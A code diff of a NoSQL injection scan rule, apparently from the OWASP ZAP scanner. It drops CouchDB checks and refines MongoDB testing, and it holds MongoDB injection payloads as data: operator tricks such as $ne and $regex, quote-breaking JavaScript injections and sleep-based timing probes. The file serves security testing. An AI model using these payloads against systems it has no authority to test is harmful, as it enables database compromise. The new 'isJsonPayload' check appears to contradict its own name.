@@ -33,6 +33,7 @@ import org.parosproxy.paros.Constant;
 import org.parosproxy.paros.core.scanner.AbstractAppParamPlugin;
 import org.parosproxy.paros.core.scanner.Alert;
 import org.parosproxy.paros.core.scanner.Category;
+import org.parosproxy.paros.core.scanner.NameValuePair;
 import org.parosproxy.paros.network.HttpMessage;
 import org.parosproxy.paros.network.HttpRequestHeader;
 import org.zaproxy.zap.model.Tech;
@@ -41,17 +42,13 @@ import org.zaproxy.zap.model.TechSet;
 import net.sf.json.JSONException;
 import net.sf.json.JSONObject;
 
-
 /**
  * @author l.casciaro
  *
  */
 public class TestNoSQLInjection extends AbstractAppParamPlugin {
-	
-	
-	
+
 	// Prefix for internationalised messages used by this rule
-	 
 	private static final String MESSAGE_PREFIX = "ascanalpha.testnosqlinjection.";
 	private static final String JSON_ATTACK = "json";
 	private static final String PARVAL_ATTACK = "paramvalue";
@@ -62,84 +59,46 @@ public class TestNoSQLInjection extends AbstractAppParamPlugin {
 	private static final int SLEEP_TIME_SHORT=500;
 	private static final int SLEEP_TIME_LONG=2000;
 	private static final int DELTA_TIME=200;
-
+	private boolean isJsonPayload;
+	
 	private static final int ID = 40033;
 	private static final int CWED_ID = 943;
 	private static final int WASC_ID = 19;
 	
+	//START MongoDB	
 	private static final String MONGO_INDEX = "mongo";
-	private static final String COUCH_INDEX = "couch";
-	private String indexDbSel = MONGO_INDEX;
+	private String indexDbSel = MONGO_INDEX;	
+	private static final String[] MONGO_URL_ERROR_INJECTION  = {"\"", "'", "//", "});",");"	};
+	private static final String[] MONGO_ERROR_MATCHING_STRING =  {
+			"retval", "Unexpected token", "mongoDB", "SyntaxError", "ReferenceError", "Illegal", TOKEN };
 	
-	
-	
-	//START MongoDB
-	private static final String[] MONGO_ERROR_MATCHING_STRING = 
-
-			new String[] { 
-					"retval", "Unexpected token", "mongoDB", "SyntaxError", "ReferenceError", "Illegal", TOKEN };
-	
-	private static final String[][] MONGO_URL_PARAM_VALUE_INJECTION = new String[][] {
-		{ "[$ne]", "0"}, {"[$regex]", ".*"}, {"[$gt]", "0"}};
-		
-	private static final String[] MONGO_URL_ERROR_INJECTION = 	{
-		"\"",
-		"'",
-		"//",
+	private static final String[][] MONGO_URL_PARAM_VALUE_INJECTION = new String[][] { { "[$ne]", "0"}, 
+		{"[$regex]", ".*"}, {"[$gt]", "0"}
 	};
-	
 	private static final String[] MONGO_URL_VALUE_INJECTION = {
 		"'; return (true); var notReaded='",
 		"'); print("+TOKEN+"); print('",
-		"_id);}, function(kv) { return 1; },"	+
-		"{ out: 'x'}); print('Injection'); "	+ 
-		"return 1; db.noSQL_injection.mapReduce(function()" + 
-		"{ emit(1,1",
+		"_id);}, function(kv) { return 1; }, { out: 'x'}); print('Injection'); "	+ 
+		"return 1; db.noSQL_injection.mapReduce(function() { emit(1,1",
 		"true, $where: '1 == 1'",		
 	};
-
 	private static final String[][] MONGO_TIMED_VALUE_INJECTION = {
 			{"\"'); sleep("+SLEEP_TIME_SHORT+"); print('\"", "\"'); sleep("+SLEEP_TIME_LONG+"); print('\""},
 			{"'; sleep("+SLEEP_TIME_SHORT+"); var x='", "'; sleep("+SLEEP_TIME_LONG+"); var x='"}
 	};
-	
 	private static final String[][] MONGO_JSON_PARAM_VALUE_INJECTION = { 
 		{"$ne", "0"},
 		{"$gt", ""},
 		{"$regex", ".*"}
 	};
 	// END MongoDB
-	
-	// START CouchDB
-	private static final String[] COUCH_URL_VALUE_INJECTION = {
-			"_all_dbs",
-			"_changes",
-			"_compact",
-			"_design",
-			"temp_view",
-			"_view_cleanup",
-			"_info",
-			"_list",
-			"_rewrite",
-			"_show",
-			",_update",
-			"_view",
-			"_acrive_tasks"
-	};
-	// END CouchDB
-	
-	
-	private static final String[][] EMPTY_PARAM_VALUE = new String[0][0];
-	private static final String[] EMPTY_VALUE = new String[0];	
-	
+
 	// The set of all NoSQL DB-Drivers technology pairs to test
 	private enum NOSQLDB{
 
-		mongoDB(Tech.MongoDB, MONGO_URL_VALUE_INJECTION, MONGO_URL_ERROR_INJECTION, MONGO_URL_PARAM_VALUE_INJECTION,
-				MONGO_JSON_PARAM_VALUE_INJECTION, MONGO_TIMED_VALUE_INJECTION, MONGO_ERROR_MATCHING_STRING, MONGO_INDEX)
-		
-		, couchDB(Tech.CouchDB, COUCH_URL_VALUE_INJECTION, EMPTY_VALUE, EMPTY_PARAM_VALUE, EMPTY_PARAM_VALUE, 
-				EMPTY_PARAM_VALUE, EMPTY_VALUE, COUCH_INDEX);
+		mongoDB(/* Tech.MongoDB */ Tech.Db, MONGO_URL_VALUE_INJECTION, MONGO_URL_ERROR_INJECTION, 
+				MONGO_URL_PARAM_VALUE_INJECTION, MONGO_JSON_PARAM_VALUE_INJECTION, MONGO_TIMED_VALUE_INJECTION, 
+				MONGO_ERROR_MATCHING_STRING, MONGO_INDEX);
 		
 		private final String name;
 		private final Tech dbTech;
@@ -154,20 +113,20 @@ public class TestNoSQLInjection extends AbstractAppParamPlugin {
 		/**
 		 * @param t the Technology
 		 * @param uv url-encoded payload values 
-		 * @param ue url-encoded payload values
+		 * @param ue breaking-db payload values
 		 * @param upv arrays of url-encoded parameter-value pair
 		 * @param jpv arrays of json payload values
 		 * @param tvi arrays of url-encoded payload values 
 		 * @param ep arrays of error-checkinig strings
 		 * @param p prefix of the @dbTech name
 		 */
-		private NOSQLDB(Tech t, String[] uv, String[] ue, String[][] upv, String[][] jpv, String[][] tvi, String[] ep, 
+		private NOSQLDB(Tech t, String[] uv, String[] ej, String[][] upv, String[][] jpv, String[][] tvi, String[] ep, 
 				String is) {
 			
 			name=t.getName();
 			dbTech=t;
 			urlEncValueInjection=uv;
-			urlEncErrorInjection=ue;
+			urlEncErrorInjection =ej;
 			urlEncParamValueInjection=upv;
 			jsonParamValueInjection=jpv;
 			urlEncTimedValueInjection=tvi;
@@ -281,6 +240,15 @@ public class TestNoSQLInjection extends AbstractAppParamPlugin {
 	}
 	
 	@Override
+	public void scan(HttpMessage msg, NameValuePair originalParam) {
+
+		isJsonPayload = originalParam.getType() != NameValuePair.TYPE_POST_DATA &
+					originalParam.getType() != NameValuePair.TYPE_JSON;
+		
+		super.scan(msg, originalParam);
+	}
+	
+	@Override
 	public void scan(HttpMessage msg, String param, String value) {
 
 		try {			
@@ -290,7 +258,9 @@ public class TestNoSQLInjection extends AbstractAppParamPlugin {
 				
 				if(inScope(nosql.getDbTech())){
 					startUrlEncodedScan(nosql, msg, param, value);
-					startJsonScan(nosql, msg, param, value);
+					if(isJsonPayload) {
+						startJsonScan(nosql, msg, param, value);
+					}
 				}
 			}
 		} catch (SocketException ex) {
@@ -313,20 +283,19 @@ public class TestNoSQLInjection extends AbstractAppParamPlugin {
 
 	private void startUrlEncodedScan(NOSQLDB nosql, HttpMessage msg, String param, String value) throws IOException {
 		
-		HttpMessage baseMsg;
+		HttpMessage injectedMsg;
 		long intervalBaseMessage, intervalInjectedMessage; 
-		Instant now;
-		baseMsg = getNewMsg();
-		setParameter(baseMsg, param, TOKEN);
-		now = Instant.now();
-		sendAndReceive(baseMsg);
-		intervalBaseMessage = ChronoUnit.MILLIS.between(now, Instant.now());
+		Instant start;
+		setParameter(msg, param, TOKEN);
+		start = Instant.now();
+		sendAndReceive(msg);
+		intervalBaseMessage = ChronoUnit.MILLIS.between(start, Instant.now());
 		
 		for(String[] pv : nosql.getUrlEncParamValueInjection()) {
 			if(isStop()) {
 				return;
 			}
-			if(isBingo(baseMsg, getNewMsg(), false, PARVAL_ATTACK, param+pv[0], pv[1], nosql)) {
+			if(isBingo(msg, getNewMsg(), false, PARVAL_ATTACK, param+pv[0], pv[1], nosql)) {
 				break;
 			}
 		}
@@ -335,7 +304,7 @@ public class TestNoSQLInjection extends AbstractAppParamPlugin {
 			if(isStop()) {
 				return;
 			}
-			if(isBingo(baseMsg, getNewMsg(), false, VALUE_ATTACK, param, v, nosql)) {
+			if(isBingo(msg, getNewMsg(), false, VALUE_ATTACK, param, v, nosql)) {
 				break;
 			}
 		}
@@ -344,7 +313,7 @@ public class TestNoSQLInjection extends AbstractAppParamPlugin {
 			if(isStop()) {
 				return;
 			}
-			if(isBingo(baseMsg, getNewMsg(), true, CRASH_ATTACK, param, ej, nosql)) {
+			if(isBingo(msg, getNewMsg(), true, CRASH_ATTACK, param, ej, nosql)) {
 				break;
 			}
 		}
@@ -354,25 +323,23 @@ public class TestNoSQLInjection extends AbstractAppParamPlugin {
 				return;
 			}
 			String attackType = TIMED_ATTACK;
-			HttpMessage injectedMsg = getNewMsg();
-			String valueInjected =tvi[0];
-			setParameter(injectedMsg, param, valueInjected);
-			now = Instant.now();
+			injectedMsg = getNewMsg();
+			setParameter(injectedMsg, param, tvi[0]);
+			start = Instant.now();
 			sendAndReceive(injectedMsg, false);
-			intervalInjectedMessage = ChronoUnit.MILLIS.between(now, Instant.now());
+			intervalInjectedMessage = ChronoUnit.MILLIS.between(start, Instant.now());
 			
 			if(isTimedInjected(intervalBaseMessage,intervalInjectedMessage, SLEEP_TIME_SHORT)) {
 				// try for a longer time to exclude transmission delays
 				injectedMsg = getNewMsg();
-				valueInjected =tvi[1];
-				setParameter(injectedMsg, param, valueInjected);
-				now = Instant.now();
+				setParameter(injectedMsg, param, tvi[1]);
+				start = Instant.now();
 				sendAndReceive(injectedMsg, false);
-				intervalInjectedMessage = ChronoUnit.MILLIS.between(now, Instant.now());
+				intervalInjectedMessage = ChronoUnit.MILLIS.between(start, Instant.now());
 				
 				if(isTimedInjected(intervalBaseMessage,intervalInjectedMessage, SLEEP_TIME_LONG)) {
 					bingo(Alert.RISK_HIGH, Alert.CONFIDENCE_HIGH, getName(), getDescription(), null, 
-							param, valueInjected, getExtraInfo(attackType), getSolution(), injectedMsg);
+							param, tvi[1], getExtraInfo(attackType), getSolution(), injectedMsg);
 					break;
 				}
 			}
@@ -469,7 +436,8 @@ public class TestNoSQLInjection extends AbstractAppParamPlugin {
 	 * @return true if the @originalMsg body isn't the same of the {@injectedMsg} one, false otherwise.
 	 * 
 	 */
-	private boolean differingOnlyString(String originalMsg, String injectedMsg, String valueBase, String valueInj) {
+	private static boolean differingOnlyString(String originalMsg, String injectedMsg, String valueBase,
+			String valueInj) {
 
 		int lengthBase = originalMsg.length();
 		int lengthInjected = injectedMsg.length();
